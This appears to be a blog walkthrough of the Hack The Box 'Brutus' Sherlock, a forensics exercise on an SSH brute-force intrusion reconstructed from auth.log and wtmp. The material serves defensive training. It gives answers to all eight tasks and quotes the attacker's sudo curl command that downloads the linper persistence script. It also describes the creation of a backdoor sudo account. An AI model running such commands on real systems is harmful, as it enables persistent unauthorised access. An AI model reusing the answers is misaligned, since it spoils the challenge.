Here's my first writeup of 2026! I wanted to get a jump on starting to work my way though the HTB Sherlocks, since I've never done them before, and (almost) any experience is good experience.

## The Beginning

On the webpage for the Sherlock I was presented with a password protected `.zip` archive and 8 tasks to complete.

![brutus home page](/blog/posts/media/brutus-sherlock-writeup/overview.png) 

After downloading the file, I went to extract it, but was faced with an interesting error:

![archive failed extraction](/blog/posts/media/brutus-sherlock-writeup/bad-extract.png) 

A quick Google search tells me that the error `unsupported compression method 99` means that the regular unix `unzip` binary isn't able to extract those files due to the compression method used. What I can do, however; is use `7z` since it supports those compression methods.

![archive correct extraction](/blog/posts/media/brutus-sherlock-writeup/good-extract.png) 

After inputting the password, I saw that 3 files were extracted: `auth.log`, `utmp.py`, and `wtmp`

## The tasks begin 

### Task 1

The first task is to: "Analyze the `auth.log`. What is the IP address used by the attacker to carry out a brute force attack?"

I started by opening the file in `vim` where I can see a log of all the authentication attempts from `pam_unix`. For the first little bit, the traffic seems normal with authentication over `SSH` to a user named `confluence`. But, at line 68 there's something new: "Invalid user admin from 65.2.161.68 port 46380". These types of messages keep coming through from the same IP address, across a number of different usernames. It looks like this is the attacker making their brute force attack.

![brute force attempts](/blog/posts/media/brutus-sherlock-writeup/brute-force-attempts.png) 

After inputting the IP address "65.2.161.68" to the prompt for the task, I see that this is the correct IP address.

![task 1 complete](/blog/posts/media/brutus-sherlock-writeup/task-1.png) 

### Task 2

The second task is: "The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?"

Looking deeper into the `auth.log` on line 281 I saw "Accepted password for root from 65.2.161.68". Clearly the attacker has gotten control of the root account. Just a little bit later I see the lines "session opened for user root(uid=0) by (uid=0)" and "New session 34 of user root." This confirms that the attacker is using the root account.

![successful login as root](/blog/posts/media/brutus-sherlock-writeup/root-success.png) 

After inputting "root" into the prompt for the task, I get a confirmation this is the correct account.

![task 2 complete](/blog/posts/media/brutus-sherlock-writeup/task-2.png)

### Task 3

The third task is: "Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be differnt than the authentication time, and can be found in the wtmp artifact."

This meant that I could no longer rely on the `auth.log`. One issue that I ran into was that when I attempted to open the file in `vim`, I quickly found out that this is a binary file. After double-checking by running the `file` command on the wtmp file, that confirmed the file is a data format, not ascii-text.

![wtmp filetype](/blog/posts/media/brutus-sherlock-writeup/wtmp-type.png) 

Once again, heading to Google gives an easier answer. This is a specific log file that can be read using the `utmpdump` command. After running the command on the file, all of the data got outputted to `stdout`, so I redirected the output to a file for easy viewing and manipulation.

![wtmp dump command](/blog/posts/media/brutus-sherlock-writeup/wtmp-dump.png) 

Taking a look at this file shows a few different events: reboot, login, runlevel, and sessions. From the `auth.log` file, I knew that the attack occured on March 6th 2024, and I knew that the root user was connected at around 06:32. Therefore, by checking the events inside the `wtmp-dump/dump` file that are around that time, I should see a login event for the root user.

Lo and behold, at the bottom of the file on line 27 is a login event for the root user from the attacker's IP address on 2024-03-06 06:32:45

![root user login time](/blog/posts/media/brutus-sherlock-writeup/login-time.png) 

After inputting the time I found into the prompt for the task, I get a confirmation this is the login time.

![task 3 complete](/blog/posts/media/brutus-sherlock-writeup/task-3.png) 

### Task 4

The fourth task is: "SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?

I've seen the answer to this question before, on line 324 after the attacker logs in as root. Looking back to that I found that the SSH session number is 37.

![ssh session number](/blog/posts/media/brutus-sherlock-writeup/ssh-session.png) 

After dropping this into the prompt for the task I'm reassured that this is correct.

![task 4 complete](/blog/posts/media/brutus-sherlock-writeup/task-4.png) 

### Task 5

The fifth task is: "The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?"

Looking through `auth.log` I found an interesting chain of events. After the root user logged in over SSH, a new group was created, and after that, a new user was created. Then the new user was added to the `sudo` group, giving the user root access. The username for that user is cyberjunkie.

![new user added](/blog/posts/media/brutus-sherlock-writeup/new-user-added.png) 

After inputting that username into the prompt for the task, I see this was the correct username.

![task 5 complete](/blog/posts/media/brutus-sherlock-writeup/task-5.png) 

### Task 6

The sixth task is: "What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new user account?"

I honestly didn't know what this was, so I turned to Google for some much needed assistance. After poking around on the MITRE website and learning about how they define stuff, I found the ID T1136.001.

I dropped that in the prompt for the task, and got confirmation that was correct.

![task 6 complete](/blog/posts/media/brutus-sherlock-writeup/task-6.png) 

### Task 7

The seventh task is: "What time did the attacker's first SSH session end according to auth.log?"

This should be fairly simple to find. Diving back in to `auth.log` I'm looking for the word disconnect, so doing a simple search inside vim brings me to the exact line I'm looking for. There I see the timestamp of Mar 6 06:37:24

![disconnect](/blog/posts/media/brutus-sherlock-writeup/disconnect.png) 

I put the timestamp 2024-03-06 06:37:24 into the prompt for the task, and confirmed this was the correct time.

![task 7 complete](/blog/posts/media/brutus-sherlock-writeup/task-7.png) 

### Task 8

The eighth task is: "The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?"

This last task is slightly more tricky than the other other tasks because there's one command that's thrown in there to throw you off, but the real command I'm looking for should be pretty obvious. Near the bottom of `auth.log` I see line that has `sudo` in it. Upon further inspection I see that this is the command being run: "/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh". Now, linper is a system persistence script, which makes compete sense to run on a compromised machine like this.

![linper download](/blog/posts/media/brutus-sherlock-writeup/linper.png) 

After dropping that command in the prompt for the task, I see that's the command we're looking for.

![task 8 complete](/blog/posts/media/brutus-sherlock-writeup/task-8.png) 

## The end

That's the Sherlock complete! This honestly didn't take me too long to complete, a super easy challenge. Maybe the next Sherlock I do, I'll ramp up the difficulty on.

Until next time
